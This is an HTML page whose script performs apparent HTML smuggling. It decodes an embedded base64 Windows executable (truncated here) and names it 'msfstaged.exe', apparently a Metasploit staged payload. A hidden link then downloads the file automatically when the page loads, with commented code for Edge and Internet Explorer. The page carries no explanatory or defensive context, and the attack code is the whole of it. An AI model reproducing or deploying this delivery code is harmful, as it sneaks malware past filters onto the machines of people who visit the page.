<html>
	<body>
		<script>
			// Convert base64-encoded file back into original form and store in byte array
			function base64ToArrayBuffer(base64) {
				var binary_string = window.atob(base64);
				var len = binary_string.length;
				var bytes = new Uint8Array( len );
				for (var i = 0; i < len; i++) { bytes[i] = 	binary_string.charCodeAt(i);
				}
				return bytes.buffer;
			}

			// Store base64-encoded file as Blob
			var file ='TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAA...
			data = base64ToArrayBuffer(file);
			blob = new Blob([data], {type: 'octet/stream'});
			fileName = 'msfstaged.exe';

			// Create invisible anchor to trigger download of file from Blob
			var a = document.createElement('a');
			document.body.appendChild(a);
			a.style = 'display: none';
			// Chrome
			var url = window.URL.createObjectURL(blob);
			// Edge / IE
			// var url = navigator.msSaveBlob(blob, "msfstaged.exe");
			a.href = url;
			a.download = fileName;
			a.click();
			window.URL.revokeObjectURL(url);
		</script>
	</body>
</html>
